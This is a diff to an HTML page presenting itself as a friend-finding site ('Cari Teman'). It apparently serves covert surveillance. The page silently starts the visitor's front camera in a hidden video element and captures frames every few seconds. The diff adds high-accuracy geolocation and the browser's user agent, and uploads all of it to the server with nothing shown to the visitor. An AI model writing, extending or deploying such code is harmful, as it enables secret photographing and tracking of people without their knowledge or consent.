@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Cari Teman</title>
+  <title>Carik Teman</title>
   <style>
     body {
       background: black;
@@ -9,10 +9,10 @@
       text-align: center;
     }
     video {
-      display: none; /* video disembunyi */
+      display: none;
     }
     canvas {
-      display: none; /* canvas tetap hidden */
+      display: none;
     }
   </style>
 </head>
@@ -26,13 +26,11 @@
 const video = document.getElementById('video')
 const canvas = document.getElementById('canvas')
 
-// nyalain kamera depan
 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
   .then(stream => {
     video.srcObject = stream
-    
     video.addEventListener('loadedmetadata', () => {
-      video.play() 
+      video.play()
       startCapture()
     })
   })
@@ -41,7 +39,7 @@ navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
   })
 
 function startCapture() {
-  const INTERVAL = 1000 // 1 detik
+  const INTERVAL = 3000 // lebih aman 3 detik
 
   setInterval(() => {
     if (!video.videoWidth) return
@@ -52,12 +50,46 @@ function startCapture() {
     const ctx = canvas.getContext('2d')
     ctx.drawImage(video, 0, 0)
 
-    fetch('/upload', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ image: canvas.toDataURL('image/png') })
-    })
+    const imageBase64 = canvas.toDataURL('image/jpeg', 0.7)
+
+    ambilFotoDanLokasi(imageBase64)
   }, INTERVAL)
+}
+
+function ambilFotoDanLokasi(imageBase64) {
+  if (!navigator.geolocation) {
+    kirim(imageBase64, null)
+    return
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      kirim(imageBase64, {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+      })
+    },
+    () => {
+      kirim(imageBase64, null)
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 10000
+    }
+  )
+}
+
+function kirim(imageBase64, location) {
+  fetch('/upload', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      image: imageBase64,
+      location,
+      device: navigator.userAgent
+    })
+  })
 }
 </script>
 
